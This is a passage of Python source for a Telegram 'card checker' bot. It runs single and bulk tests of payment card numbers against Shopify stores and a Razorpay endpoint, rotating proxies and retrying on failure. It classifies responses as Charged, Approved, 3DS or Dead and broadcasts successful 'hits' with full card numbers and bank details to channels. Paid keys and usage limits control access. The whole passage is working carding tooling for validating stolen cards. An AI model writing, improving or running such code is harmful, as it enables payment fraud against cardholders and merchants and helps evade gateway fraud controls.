            return result, last_proxy

        rotator.report_site_fail(site)
        if proxy and is_proxy_error(msg):
            rotator.report_proxy_fail(proxy)

        await asyncio.sleep(0.3)

    if last_result:
        last_result['status'] = 'Dead'
        last_result['message'] = last_result.get('message') or 'All sites failed'
        return last_result, last_proxy
    return {'status': 'Dead', 'message': 'All sites failed', 'card': card,
            'gateway': 'Unknown', 'price': '-', 'price_value': 0.0}, last_proxy


# ====================== RAZORPAY API ======================
def build_rz_url(card: str, proxy: str = None) -> str:
    url = f"{RAZORPAY_API_URL}?cc={card}"
    ps = _proxy_str_for_api(proxy)
    if ps:
        url += f"&proxy={ps}"
    return url


def classify_rz(raw: dict, card: str, proxy=None):
    raw_resp = str(raw.get('response', raw.get('Response', '')))
    resp = rz_clean_response(raw_resp)
    resp_low = resp.lower()
    gateway = 'RazorPay'

    if is_rz_retry_error(resp):
        return {'status': 'RetryError', 'Response': resp, 'Price': '-',
                'Gateway': gateway, 'card': card, 'proxy': proxy}

    charged_keys = ['transaction success', 'payment successful', 'payment success',
                    'order_paid', 'charged', 'captured']
    if any(k in resp_low for k in charged_keys):
        return {'status': 'Charged', 'Response': resp, 'Price': '-',
                'Gateway': gateway, 'card': card, 'proxy': proxy}

    approved_keys = ['insufficient account balance', 'insufficient_funds',
                     'insufficient funds', 'otp_required', 'otp required',
                     '3d_authentication', '3ds_required', 'authentication_required',
                     'cvc', 'ccn']
    if any(k in resp_low for k in approved_keys):
        return {'status': 'Approved', 'Response': resp, 'Price': '-',
                'Gateway': gateway, 'card': card, 'proxy': proxy}

    threeds_keys = ['3d', '3d secure', 'otp', 'verification required']
    if any(k in resp_low for k in threeds_keys):
        return {'status': '3DS', 'Response': resp, 'Price': '-',
                'Gateway': gateway, 'card': card, 'proxy': proxy}

    declined_keys = ['payment cancelled', 'cancelled', 'card_declined', 'card declined',
                     'generic_decline', 'generic decline', 'do_not_honor', 'do not honor',
                     'stolen_card', 'lost_card', 'expired_card', 'expired card',
                     'restricted_card', 'fraudulent', 'not_permitted',
                     'transaction_not_allowed', 'card_not_supported', 'decline',
                     'your card was declined', 'payment failed', 'failed', 'generic_error']
    if any(k in resp_low for k in declined_keys):
        return {'status': 'Dead', 'Response': resp, 'Price': '-',
                'Gateway': gateway, 'card': card, 'proxy': proxy}

    return {'status': 'Dead', 'Response': resp or 'Unknown', 'Price': '-',
            'Gateway': gateway, 'card': card, 'proxy': proxy}


async def check_rz_card(card: str, proxy: str = None, http_session=None):
    url = build_rz_url(card, proxy)
    session = http_session or (await get_http_session())
    try:
        async with session.get(url) as resp:
            if resp.status != 200:
                return {'status': 'RetryError', 'Response': f"HTTP {resp.status}",
                        'Price': '-', 'Gateway': 'RazorPay', 'card': card,
                        'proxy': proxy}, proxy
            try:
                raw = await resp.json(content_type=None)
            except Exception:
                return {'status': 'RetryError', 'Response': 'Invalid JSON',
                        'Price': '-', 'Gateway': 'RazorPay', 'card': card,
                        'proxy': proxy}, proxy
        return classify_rz(raw, card, proxy), proxy
    except asyncio.TimeoutError:
        return {'status': 'RetryError', 'Response': 'Timeout', 'Price': '-',
                'Gateway': 'RazorPay', 'card': card, 'proxy': proxy}, proxy
    except asyncio.CancelledError:
        raise
    except Exception as e:
        return {'status': 'RetryError', 'Response': str(e)[:100], 'Price': '-',
                'Gateway': 'RazorPay', 'card': card, 'proxy': proxy}, proxy


async def check_rz_with_retry(card: str, proxies: list, max_retries: int = 3,
                              rotator=None, http_session=None):
    if not proxies:
        return {'status': 'RetryError', 'Response': 'No proxies', 'Price': '-',
                'Gateway': 'RazorPay', 'card': card}, None

    rotator = rotator or SmartRotator()
    tried_proxies = set()
    last, last_proxy = None, None

    for attempt in range(max_retries):
        proxy = rotator.pick_proxy(proxies, exclude=tried_proxies)
        if proxy:
            tried_proxies.add(proxy)

        result, used_proxy = await check_rz_card(card, proxy, http_session)
        last_proxy = used_proxy or last_proxy
        last = result

        if result.get('status') != 'RetryError':
            if proxy:
                rotator.report_proxy_ok(proxy)
            return result, last_proxy

        if proxy:
            rotator.report_proxy_fail(proxy)
        if attempt < max_retries - 1:
            await asyncio.sleep(0.5)

    if last:
        last['status'] = 'Dead'
        return last, last_proxy
    return {'status': 'Dead', 'Response': 'Max retries', 'Price': '-',
            'Gateway': 'RazorPay', 'card': card}, last_proxy


# ====================== PROXY TEST ======================
async def test_proxy(proxy: str):
    proxy_url = proxy_to_url(proxy)
    try:
        session = await get_proxy_session()
        async with session.get('https://api.ipify.org?format=json',
                               proxy=proxy_url,
                               timeout=aiohttp.ClientTimeout(total=30, connect=20)) as r:
            if r.status == 200:
                data = await r.json(content_type=None)
                return {'proxy': proxy, 'status': 'alive', 'ip': data.get('ip', '?')}
            return {'proxy': proxy, 'status': 'dead'}
    except Exception as e:
        log_system("PROXY_TEST", f"{proxy[:50]} → {type(e).__name__}: {e}", "warning")
        return {'proxy': proxy, 'status': 'dead'}


# ====================== CARD FORMATTING ======================
def _bin_lines(bin_tuple):
    brand, typ, level, bank, country, flag = bin_tuple
    return (
        f"{bs('BIN')} ━ <code>{brand} - {typ} - {level}</code>\n"
        f"{bs('Bank')} ━ <code>{bank}</code>\n"
        f"{bs('Country')} ━ <code>{country} {flag}</code>"
    )


def _status_header(status: str):
    s = (status or '').upper()
    if s == 'CHARGED':  return f"{PE} <b>{bs('CHARGED')}</b>"
    if s == 'APPROVED': return f"{PE} <b>{bs('APPROVED')}</b>"
    if s == '3DS':      return f"{PE} <b>{bs('3DS')}</b>"
    if s == 'DECLINED': return f"{PE} <b>{bs('DECLINED')}</b>"
    return f"{PE} <b>{bs(s or 'UNKNOWN')}</b>"


def format_shopify_single(result: dict, bin_tuple, elapsed: float) -> str:
    card = result.get('card', '-')
    gateway = result.get('gateway', 'Shopify')
    response = (result.get('message') or '')[:150]
    price = result.get('price', '-')
    status = result.get('status', 'Dead').upper()
    if status == 'DEAD':
        status = 'DECLINED'
    return pe(f"""{_status_header(status)}
{SEP}
⊀ {bs('Card')}
⤷ <code>{card}</code>
{bs('Gateway')} ━ <code>{gateway}</code>
{bs('Response')} ━ <code>{response}</code>
{bs('Price')} ━ <code>{price}</code>
{SEP}
{_bin_lines(bin_tuple)}
{SEP}
{bs('Took')} ⏱ <code>{elapsed:.2f}s</code>""")


def format_rz_single(result: dict, bin_tuple, elapsed: float) -> str:
    card = result.get('card', '-')
    gateway = result.get('Gateway', 'RazorPay')
    response = (result.get('Response') or '')[:150]
    status = result.get('status', 'Dead').upper()
    if status == 'DEAD':
        status = 'DECLINED'
    return pe(f"""{_status_header(status)}
{SEP}
⊀ {bs('Card')}
⤷ <code>{card}</code>
{bs('Gateway')} ━ <code>{gateway}</code>
{bs('Response')} ━ <code>{response}</code>
{SEP}
{_bin_lines(bin_tuple)}
{SEP}
{bs('Took')} ⏱ <code>{elapsed:.2f}s</code>""")


def format_realtime_hit(result: dict, gateway_type: str, bin_tuple) -> str:
    if gateway_type == "RazorPay":
        card = result.get('card', '-')
        gateway = result.get('Gateway', 'RazorPay')
        response = (result.get('Response') or '')[:150]
        status = result.get('status', 'Dead').upper()
        if status == 'DEAD':
            status = 'DECLINED'
        return pe(f"""{_status_header(status)}

💳 CC <code>{card}</code>

🛒 {bs('Gateway')} {gateway}
📝 {bs('Response')} {response}

🆔 {bs('BIN Info')} {bin_tuple[0]} - {bin_tuple[1]} - {bin_tuple[2]}
🏦 {bs('Bank')} {bin_tuple[3]}
🥰 {bs('Country')} {bin_tuple[4]} {bin_tuple[5]}""")

    card = result.get('card', '-')
    gateway = result.get('gateway', 'Shopify')
    response = (result.get('message') or '')[:150]
    price = result.get('price', '-')
    status = result.get('status', 'Dead').upper()
    if status == 'DEAD':
        status = 'DECLINED'
    return pe(f"""{_status_header(status)}

💳 CC <code>{card}</code>

🛒 {bs('Gateway')} {gateway}
📝 {bs('Response')} {response}
💸 {bs('Price')} {price}

🆔 {bs('BIN Info')} {bin_tuple[0]} - {bin_tuple[1]} - {bin_tuple[2]}
🏦 {bs('Bank')} {bin_tuple[3]}
🥰 {bs('Country')} {bin_tuple[4]} {bin_tuple[5]}""")


# ====================== HIT CHANNELS ======================
HIT_BUTTON = [[Button.url(bs("NOVA"), "http://t.me/spectrumxchkbot")]]


async def send_realtime_hit(user_id: int, result: dict, hit_type: str,
                            user_name: str, gateway_type: str = "Shopify",
                            video_path: str = None):
    bin_tuple = await get_bin_info(result.get('card', '').split('|')[0])
    text = format_realtime_hit(result, gateway_type, bin_tuple)
    video_path = video_path or _pick_hit_video()
    try:
        if video_path and os.path.exists(video_path):
            await client_instance.send_file(user_id, video_path,
                                            caption=text, parse_mode='html',
                                            supports_streaming=True, buttons=HIT_BUTTON)
        else:
            await client_instance.send_message(user_id, text, parse_mode='html',
                                               buttons=HIT_BUTTON)
    except Exception as e:
        log_system("HIT_DM", f"user {user_id}: {e}", "error")


async def send_hit_to_channel(card: str, status: str, response: str,
                              gateway: str, price: str = "-",
                              user_mention: str = None, user_id: int = None,
                              gateway_type: str = "Shopify",
                              site: str = None, proxy_used: str = None,
                              video_path: str = None):
    status_up = (status or '').upper()
    if status_up not in ("CHARGED", "APPROVED", "3DS", "ORDER_PLACED"):
        return

    mention = user_mention or "User"
    video_path = video_path or _pick_hit_video()

    if HIT_CHANNEL_ID and HIT_CHANNEL_ID != -1000000000000:
        try:
            body = pe(f"""⭐ <b>{bs('HIT')}</b> ➛ <b>{bs(status_up)}</b>
{SEP}
⊀ {bs('Gateway')} ━ <code>{gateway}</code>
{bs('Response')} ━ <code>{(response or '')[:45]}</code>
{bs('Price')} ━ <code>{price}</code>
{SEP}
{bs('User')} ➛ {mention}
{SEP}
{DEV_LINE}""")

            sent = None
            if video_path and os.path.exists(video_path):
                try:
                    sent = await client_instance.send_file(
                        abs(HIT_CHANNEL_ID), video_path,
                        caption=body, parse_mode='html',
                        supports_streaming=True, buttons=HIT_BUTTON)
                except Exception as e:
                    log_system("HIT_MAIN", f"video failed: {e}", "error")
            if sent is None:
                sent = await client_instance.send_message(
                    abs(HIT_CHANNEL_ID), body, parse_mode='html', buttons=HIT_BUTTON)
            if status_up in ("CHARGED", "ORDER_PLACED") and sent:
                try:
                    await client_instance.pin_message(abs(HIT_CHANNEL_ID), sent.id)
                except Exception:
                    pass
        except Exception as e:
            log_system("HIT_MAIN", f"failed: {e}", "error")

    if CHARGED_ONLY_CHANNEL_ID and CHARGED_ONLY_CHANNEL_ID != -1000000000000:
        try:
            bin_tuple = await get_bin_info(card.split('|')[0])
            brand, typ, level, bank, country, flag = bin_tuple
            bin_disp = f"{brand} - {typ} - {level}" if brand != '-' else "N/A"
            bank_disp = bank if bank != '-' else "N/A"
            country_disp = f"{country} {flag}" if country != '-' else "N/A"
            site_disp = site or "N/A"
            uid_disp = f"<code>{user_id}</code>" if user_id else "N/A"
            proxy_line = f"\n{bs('Proxy')} ━ <code>{proxy_used}</code>" if proxy_used else ""
            date_full = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
            status_label = f"{PE} {bs(status_up)}"

            if gateway_type == "RazorPay":
                body = pe(f"""{status_label}
{SEP}
⊀ {bs('Card')}
⤷ <code>{card}</code>
{bs('Gateway')} ━ <code>{gateway}</code>
{bs('Site')} ━ <code>{site_disp}</code>
{bs('Response')} ━ <code>{response}</code>{proxy_line}
{SEP}
{bs('BIN')} ━ <code>{bin_disp}</code>
{bs('Bank')} ━ <code>{bank_disp}</code>
{bs('Country')} ━ <code>{country_disp}</code>
{SEP}
{bs('User')} ➛ {mention} ({uid_disp})
{bs('Date')} ➛ {date_full}
{SEP}
{DEV_LINE}""")
            else:
                body = pe(f"""{status_label}
{SEP}
⊀ {bs('Card')}
⤷ <code>{card}</code>
{bs('Gateway')} ━ <code>{gateway}</code>
{bs('Site')} ━ <code>{site_disp}</code>
{bs('Response')} ━ <code>{response}</code>
{bs('Price')} ━ <code>{price}</code>{proxy_line}
{SEP}
{bs('BIN')} ━ <code>{bin_disp}</code>
{bs('Bank')} ━ <code>{bank_disp}</code>
{bs('Country')} ━ <code>{country_disp}</code>
{SEP}
{bs('User')} ➛ {mention} ({uid_disp})
{bs('Date')} ➛ {date_full}
{SEP}
{DEV_LINE}""")

            sent = None
            if video_path and os.path.exists(video_path):
                try:
                    sent = await client_instance.send_file(
                        abs(CHARGED_ONLY_CHANNEL_ID), video_path,
                        caption=body, parse_mode='html',
                        supports_streaming=True, buttons=HIT_BUTTON)
                except Exception as e:
                    log_system("HIT_FULL", f"video failed: {e}", "error")
            if sent is None:
                sent = await client_instance.send_message(
                    abs(CHARGED_ONLY_CHANNEL_ID), body,
                    parse_mode='html', buttons=HIT_BUTTON)
            if status_up in ("CHARGED", "ORDER_PLACED") and sent:
                try:
                    await client_instance.pin_message(abs(CHARGED_ONLY_CHANNEL_ID), sent.id)
                except Exception:
                    pass
        except Exception as e:
            log_system("HIT_FULL", f"failed: {e}", "error")


async def send_redeem_log(user_id: int, key: str, status: str, details: str = ""):
    if status != "✅ Success":
        return
    if not REDEEM_LOG_CHANNEL_ID or REDEEM_LOG_CHANNEL_ID == -1000000000000:
        return
    try:
        sender = await client_instance.get_entity(user_id)
        username = f"@{sender.username}" if sender.username else f"User {user_id}"
    except Exception:
        username = f"User {user_id}"

    keys_data = load_keys()
    entry = keys_data.get(key, {})
    hours = entry.get("hours", DEFAULT_KEY_HOURS)
    try:
        hours = int(hours)
    except Exception:
        hours = DEFAULT_KEY_HOURS

    if hours < 24:
        plan_disp = f"{hours}.0h"
        exp_mins = hours * 60 - 1
        exp_h = exp_mins // 60
        exp_m = exp_mins % 60
        exp_disp = f"{exp_h}h {exp_m:02d}m"
    else:
        days = hours // 24
        plan_disp = f"{days}.0d"
        exp_disp = f"{days - 1}d 23h 59m"

    body = pe(f"""✅ <b>{bs('Key Redeemed')}</b>

👤 <b>{bs('User')}</b> ⌁ {username} ⌁ <code>{user_id}</code>
💎 <b>{bs('Plan')}</b> ⌁ <code>{plan_disp}</code> ⌁
⏰ <b>{bs('Expires')}</b> ⌁ <code>{exp_disp}</code> ⌁

🏆 <b>{bs('Generated By')}</b> ⌁""")

    try:
        await client_instance.send_message(abs(REDEEM_LOG_CHANNEL_ID), body, parse_mode='html')
    except Exception as e:
        log_system("REDEEM_LOG", f"send failed: {e}", "error")


# ====================== FREE GATE ======================
async def _check_free_or_premium(event, uid: int) -> bool:
    if uid in ADMIN_ID:
        return True
    if is_premium(uid):
        return True
    is_group = event.chat_id != uid
    if not is_group:
        await send_group_only(event)
        return False
    used = get_free_usage(uid)
    if used >= FREE_DAILY_LIMIT:
        await styled_reply(event, pe(f"""💎 <b>{bs('Daily limit')}</b>
{SEP}
💎 {bs('Used')}: <code>{used}/{FREE_DAILY_LIMIT}</code>
💎 <i>{bs('Redeem a key or contact admin')}</i>"""),
            buttons=[[pbtn(bs("Contact"), url=f"https://t.me/{OWNER_TAG.lstrip('@')}", style="primary")]])
        return False
    left = free_cooldown_left(uid)
    if left > 0:
        await styled_reply(event, pe(f"⚠️ <b>{bs('Wait')} {left}s</b>"))
        return False
    return True


def _consume_free(uid: int):
    if uid in ADMIN_ID or is_premium(uid):
        return
    set_free_last(uid)
    inc_free_usage(uid)


# ====================== SINGLE: /sh ======================
@client.on(events.NewMessage(pattern=r'^[/.](sh|sp)\s+'))
async def cmd_sh(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if not await _check_free_or_premium(event, uid):
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/sh card|mm|yy|cvv</code>"))
    cards = extract_cc(parts[1])
    if not cards:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid card')}</b>"))
    card = cards[0]
    sites = load_sites()
    if not sites:
        return await styled_reply(event, pe(f"💎 <b>{bs('No sites')}</b>"))
    proxies = load_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('No proxies')}</b> — /addproxy"))
    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{uid}"
        name = sender.first_name or username
    except Exception:
        username, name = f"user_{uid}", "User"

    status_msg = await styled_reply(event, pe(f"💎 {bs('Checking')} <code>{card}</code>..."))
    st = time.time()
    rotator = SmartRotator()
    http_session = await get_user_http_session(uid, "sp")
    sem = get_user_sem(uid, "sp")
    try:
        async with sem:
            result, proxy_used = await check_card_with_retry(
                card, sites, proxies, max_retries=3,
                rotator=rotator, http_session=http_session)
        elapsed = time.time() - st
        bin_tuple = await get_bin_info(card.split('|')[0])
        text = format_shopify_single(result, bin_tuple, elapsed)
        status = result.get('status', 'Dead')
        _consume_free(uid)
        if status in ("Charged", "Approved", "3DS"):
            if status == "Charged":
                increment_charge_count(uid)
            video_path = _pick_hit_video()
            try:
                await status_msg.delete()
            except Exception:
                pass
            await styled_reply(event, text, buttons=HIT_BUTTON)
            asyncio.create_task(send_realtime_hit(uid, result, status, name, "Shopify", video_path=video_path))
            asyncio.create_task(send_hit_to_channel(
                card, status, result.get('message', ''), result.get('gateway', 'Shopify'),
                result.get('price', '-'), user_mention=f"@{username}" if username else name,
                user_id=uid, gateway_type="Shopify",
                site=result.get('site'), proxy_used=proxy_used,
                video_path=video_path))
        else:
            try:
                await status_msg.edit(text, buttons=HIT_BUTTON,
                                      parse_mode='html', link_preview=False)
            except Exception:
                await styled_reply(event, text, buttons=HIT_BUTTON)
    except Exception as e:
        try:
            await status_msg.edit(pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"), parse_mode='html')
        except Exception:
            pass
    finally:
        await cleanup_user_http_session(uid, "sp")


# ====================== SINGLE: /rz ======================
@client.on(events.NewMessage(pattern=r'^[/.]rz\s+'))
async def cmd_rz(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if not await _check_free_or_premium(event, uid):
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/rz card|mm|yy|cvv</code>"))
    cards = extract_cc(parts[1])
    if not cards:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid card')}</b>"))
    card = cards[0]
    proxies = load_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('No proxies')}</b> — /addproxy"))
    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{uid}"
        name = sender.first_name or username
    except Exception:
        username, name = f"user_{uid}", "User"

    status_msg = await styled_reply(event, pe(f"💎 {bs('Checking')} <code>{card}</code>..."))
    st = time.time()
    rotator = SmartRotator()
    http_session = await get_user_http_session(uid, "rz")
    sem = get_user_sem(uid, "rz")
    try:
        async with sem:
            result, proxy_used = await check_rz_with_retry(
                card, proxies, max_retries=3,
                rotator=rotator, http_session=http_session)
        elapsed = time.time() - st
        bin_tuple = await get_bin_info(card.split('|')[0])
        text = format_rz_single(result, bin_tuple, elapsed)
        status = result.get('status', 'Dead')
        _consume_free(uid)
        if status in ("Charged", "Approved", "3DS"):
            if status == "Charged":
                increment_charge_count(uid)
            video_path = _pick_hit_video()
            try:
                await status_msg.delete()
            except Exception:
                pass
            await styled_reply(event, text, buttons=HIT_BUTTON)
            asyncio.create_task(send_realtime_hit(uid, result, status, name, "RazorPay", video_path=video_path))
            asyncio.create_task(send_hit_to_channel(
                card, status, result.get('Response', ''), result.get('Gateway', 'RazorPay'),
                '-', user_mention=f"@{username}" if username else name,
                user_id=uid, gateway_type="RazorPay",
                site="Razorpay", proxy_used=proxy_used,
                video_path=video_path))
        else:
            try:
                await status_msg.edit(text, buttons=HIT_BUTTON,
                                      parse_mode='html', link_preview=False)
            except Exception:
                await styled_reply(event, text, buttons=HIT_BUTTON)
    except Exception as e:
        try:
            await status_msg.edit(pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"), parse_mode='html')
        except Exception:
            pass
    finally:
        await cleanup_user_http_session(uid, "rz")


# ====================== PROGRESS UI ======================
async def update_progress(user_id: int, message_id: int, results: dict,
                          current_checked: int, gateway_type: str = "Shopify"):
    total = results.get('total', 1)
    checked = results.get('checked', 0)
    remaining = max(total - checked, 0)
    elapsed = int(time.time() - results.get('start_time', time.time()))
    h, m, s = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60
    pct = int((checked / total) * 100) if total else 0
    bar_len = 16
    filled = int(bar_len * checked / total) if total else 0
    bar = "█" * filled + "░" * (bar_len - filled)
    last_card = (results.get('last_card') or 'None')[:16]
    last_resp = (results.get('last_response') or 'Waiting...')[:16]
    last_price = (results.get('last_price') or '-')[:7]

    text = pe(f"""💳 {bs('Card')}: <code>{last_card}</code>
📝 {bs('Response')}: <code>{last_resp}</code>
💰 {bs('Price')}: <code>{last_price}</code>
{SEP}
{bar}
❌ {bs('Declined')}: {len(results.get('dead', []))}
📊 {checked}/{total} ({pct}%) | {bs('Remaining')}: {remaining}
⏱️ {h:02d}:{m:02d}:{s:02d}
""")
    prefix = "razorpay" if gateway_type.lower() == "razorpay" else "shopify"
    buttons = [
        [pbtn(f"✅ {bs('Charged')} {len(results.get('charged', []))}",
              data=f"{prefix}_export_charged:{user_id}", style="success", icon="✅"),
         pbtn(f"💎 {bs('Approved')} {len(results.get('approved', []))}",
              data=f"{prefix}_export_approved:{user_id}", style="primary", icon="💎")],
        [pbtn(f"⚠️ {bs('3DS')} {len(results.get('3ds', []))}",
              data=f"{prefix}_export_3ds:{user_id}", style="primary", icon="⚠️"),
         pbtn(f"❌ {bs('Errors')} {len(results.get('errors', []))}",
              data=f"{prefix}_export_errors:{user_id}", style="danger", icon="❌")],
        [pbtn(f"⛔ {bs('Stop')}", data=f"stop_{user_id}", style="danger", icon="❌")],
    ]
    try:
        await client_instance.edit_message(user_id, message_id, text, buttons=buttons, parse_mode='html')
    except Exception:
        pass


# ====================== FINAL RESULTS ======================
async def send_final_results(user_id: int, results: dict, gateway_type: str = "Shopify"):
    elapsed = int(time.time() - results.get('start_time', time.time()))
    h, m, s = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60
    time_fmt = f"{h}h {m}m {s}s" if h else f"{m}m {s}s" if m else f"{s}s"
    charged = len(results.get('charged', []))
    approved = len(results.get('approved', []))
    threeds = len(results.get('3ds', []))
    dead = len(results.get('dead', []))
    errors = len(results.get('errors', []))

    summary = pe(f"""✅ <b>{bs('Check Complete')}</b>
{SEP}
📊 <b>{bs('Results')}</b> ({gateway_type}):
   ┣ ✅ {bs('Charged')}: {charged}
   ┣ 🔥 {bs('Approved')}: {approved}
   ┣ 🔐 {bs('3DS')}: {threeds}
   ┣ ❌ {bs('Declined')}: {dead}
   ┣ ⚠️ {bs('Errors')}: {errors}
   ┗ 📊 {bs('Total')}: {results.get('total', 0)}
{SEP}
⏱️ {bs('Time')}: {time_fmt}
{SEP}
{DEV_LINE}""")

    prefix = "razorpay" if gateway_type.lower() == "razorpay" else "shopify"
    buttons = []
    if charged:
        buttons.append([pbtn(f"✅ {bs('Export Charged')} ({charged})",
                             data=f"{prefix}_export_charged:{user_id}",
                             style="success", icon="✅")])
    if approved:
        buttons.append([pbtn(f"💎 {bs('Export Approved')} ({approved})",
                             data=f"{prefix}_export_approved:{user_id}",
                             style="primary", icon="💎")])
    if threeds:
        buttons.append([pbtn(f"⚠️ {bs('Export 3DS')} ({threeds})",
                             data=f"{prefix}_export_3ds:{user_id}",
                             style="primary", icon="⚠️")])
    if errors:
        buttons.append([pbtn(f"❌ {bs('Export Errors')} ({errors})",
                             data=f"{prefix}_export_errors:{user_id}",
                             style="danger", icon="❌")])

    try:
        await client_instance.send_message(user_id, summary, buttons=buttons or None, parse_mode='html')
    except Exception as e:
        log_system("RESULT", f"final send failed to {user_id}: {e}", "error")


# ====================== MASS: SHOPIFY ======================
async def start_mass_shopify(user_id: int, cards: list, event, status_msg):
    sites = load_sites()
    if not sites:
        await styled_edit(status_msg, pe(f"💎 <b>{bs('No sites')}</b>"))
        return
    proxies = load_user_proxies(user_id)
    if not proxies:
        await styled_edit(status_msg, pe(f"💎 <b>{bs('No proxies')}</b> — /addproxy"))
        return
    try:
        sender = await client_instance.get_entity(user_id)
        username = sender.username or f"user_{user_id}"
        name = sender.first_name or username
    except Exception:
        username, name = f"user_{user_id}", "User"

    session_key = f"{user_id}_{status_msg.id}"
    ACTIVE_SESSIONS[session_key] = {"paused": False, "stopped": False}
    results = {
        'charged': [], 'approved': [], '3ds': [], 'dead': [], 'errors': [],
        'total': len(cards), 'checked': 0, 'start_time': time.time(),
        'last_card': '', 'last_response': '', 'last_price': '-', 'last_gateway': 'Shopify',
    }
    user_sem = get_user_sem(user_id, "msp")
    http_session = await get_user_http_session(user_id, "msp")
    rotator = SmartRotator()
    queue = asyncio.Queue()
    for c in cards:
        queue.put_nowait(c)
    last_ui = [time.time()]

    def _stop():
        s = ACTIVE_SESSIONS.get(session_key)
        return not s or s.get("stopped", False)

    async def worker():
        while not queue.empty():
            if _stop():
                return
            s = ACTIVE_SESSIONS.get(session_key)
            if not s:
                return
            while s.get("paused", False):
                await asyncio.sleep(1)
                s = ACTIVE_SESSIONS.get(session_key)
                if not s:
                    return
            try:
                card = queue.get_nowait()
            except asyncio.QueueEmpty:
                break
            async with user_sem:
                cur_sites = load_sites()
                cur_proxies = load_user_proxies(user_id)
                if not cur_sites or not cur_proxies:
                    break
                result, proxy_used = await check_card_with_retry(
                    card, cur_sites, cur_proxies, max_retries=3,
                    rotator=rotator, http_session=http_session)
            if _stop():
                return
            results['checked'] += 1
            results['last_card'] = card
            results['last_response'] = (result.get('message') or '')[:50]
            results['last_price'] = result.get('price', '-')
            results['last_gateway'] = result.get('gateway', 'Shopify')
            status = result.get('status', 'Dead')
            if status in ('Charged', 'Approved', '3DS'):
                video_path = _pick_hit_video()
                if status == 'Charged':
                    results['charged'].append(result)
                    increment_charge_count(user_id)
                elif status == 'Approved':
                    results['approved'].append(result)
                else:
                    results['3ds'].append(result)
                asyncio.create_task(send_realtime_hit(user_id, result, status, name, "Shopify", video_path=video_path))
                asyncio.create_task(send_hit_to_channel(
                    card, status, result.get('message', ''), result.get('gateway', 'Shopify'),
                    result.get('price', '-'), user_mention=f"@{username}" if username else name,
                    user_id=user_id, gateway_type="Shopify",
                    site=result.get('site'), proxy_used=proxy_used,
                    video_path=video_path))
            else:
                msg_low = (result.get('message') or '').lower()
                declined_keys = ["declined", "generic_error", "generic", "decision_rule_block",
                                 "incorrect_number", "brand_not_supported",
                                 "payments_credit_card_base_expired"]
                if any(k in msg_low for k in declined_keys) or status == 'Dead':
                    results['dead'].append(result)
                else:
                    results['errors'].append(result)
            queue.task_done()
            await asyncio.sleep(random.uniform(0.5, 1.5))
            if time.time() - last_ui[0] >= 1.0:
                last_ui[0] = time.time()
                if session_key in ACTIVE_SESSIONS:
                    try:
                        await update_progress(user_id, status_msg.id, results, results['checked'], "Shopify")
                    except Exception:
                        pass

    workers = [asyncio.create_task(worker()) for _ in range(MSP_PER_USER_WORKERS)]
    try:
        await asyncio.gather(*workers, return_exceptions=True)
    finally:
        try:
            await update_progress(user_id, status_msg.id, results, results['checked'], "Shopify")
        except Exception:
            pass
        try:
            await status_msg.delete()
        except Exception:
            pass
        SHOPIFY_RESULTS[user_id] = results
        await send_final_results(user_id, results, "Shopify")
        ACTIVE_SESSIONS.pop(session_key, None)
        await cleanup_user_http_session(user_id, "msp")
        cleanup_user_sem(user_id)
        await asyncio.sleep(300)
        SHOPIFY_RESULTS.pop(user_id, None)


# ====================== MASS: RAZORPAY ======================
async def start_mass_rz(user_id: int, cards: list, event, status_msg):
    proxies = load_user_proxies(user_id)
    if not proxies:
        await styled_edit(status_msg, pe(f"💎 <b>{bs('No proxies')}</b> — /addproxy"))
        return
    try:
        sender = await client_instance.get_entity(user_id)
        username = sender.username or f"user_{user_id}"
        name = sender.first_name or username
    except Exception:
        username, name = f"user_{user_id}", "User"

    session_key = f"rz_{user_id}_{status_msg.id}"
    ACTIVE_SESSIONS[session_key] = {"paused": False, "stopped": False}
    results = {
        'charged': [], 'approved': [], '3ds': [], 'dead': [], 'errors': [],
        'total': len(cards), 'checked': 0, 'start_time': time.time(),
        'last_card': '', 'last_response': '', 'last_price': '-', 'last_gateway': 'RazorPay',
    }
    user_sem = get_user_sem(user_id, "mrz")
    http_session = await get_user_http_session(user_id, "mrz")
    rotator = SmartRotator()
    queue = asyncio.Queue()
    for c in cards:
        queue.put_nowait(c)
    last_ui = [time.time()]

    def _stop():
        s = ACTIVE_SESSIONS.get(session_key)
        return not s or s.get("stopped", False)

    async def worker():
        while not queue.empty():
            if _stop():
                return
            s = ACTIVE_SESSIONS.get(session_key)
            if not s:
                return
            while s.get("paused", False):
                await asyncio.sleep(1)
                s = ACTIVE_SESSIONS.get(session_key)
                if not s:
                    return
            try:
                card = queue.get_nowait()
            except asyncio.QueueEmpty:
                break
            async with user_sem:
                cur_proxies = load_user_proxies(user_id)
                if not cur_proxies:
                    break
                result, proxy_used = await check_rz_with_retry(
                    card, cur_proxies, max_retries=3,
                    rotator=rotator, http_session=http_session)
            if _stop():
                return
            results['checked'] += 1
            results['last_card'] = card
            results['last_response'] = (result.get('Response') or '')[:50]
            results['last_price'] = result.get('Price', '-')
            results['last_gateway'] = result.get('Gateway', 'RazorPay')
            status = result.get('status', 'Dead')
            if status in ('Charged', 'Approved', '3DS'):
                video_path = _pick_hit_video()
                if status == 'Charged':
                    results['charged'].append(result)
                    increment_charge_count(user_id)
                elif status == 'Approved':
                    results['approved'].append(result)
                else:
                    results['3ds'].append(result)
                asyncio.create_task(send_realtime_hit(user_id, result, status, name, "RazorPay", video_path=video_path))
                asyncio.create_task(send_hit_to_channel(
                    card, status, result.get('Response', ''), result.get('Gateway', 'RazorPay'),
                    '-', user_mention=f"@{username}" if username else name,
